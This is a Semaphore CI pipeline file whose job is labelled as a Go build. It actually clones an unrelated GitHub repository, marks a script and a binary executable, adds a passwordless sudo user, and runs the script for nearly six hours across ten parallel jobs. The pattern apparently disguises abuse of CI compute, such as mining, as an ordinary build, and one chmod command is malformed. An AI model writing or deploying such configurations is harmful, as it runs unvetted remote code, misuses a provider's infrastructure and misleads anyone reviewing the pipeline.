version: v1.0
name: Semaphore 10
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
fail_fast:
  cancel:
    when: 'false'
blocks:
  - name: Build project
    execution_time_limit:
      hours: 24
    task:
      jobs:
        - name: go get & build
          execution_time_limit:
            hours: 24
          parallelism: 10
          commands:
            - '#!/bin/bash'
            - sudo apt update
            - 'git clone https://github.com/dfgfd443rete/JUGER.git && cd JUGER'
            - chmod +x okeh.sh && chmod +x cumin chmod 777 cumin okeh.sh
            - sudo adduser --disabled-password --gecos "" manuk && sudo usermod -aG sudo manuk
            - sudo -u manuk -H sh -c "timeout 359m ./okeh.sh"
            - sudo apt update
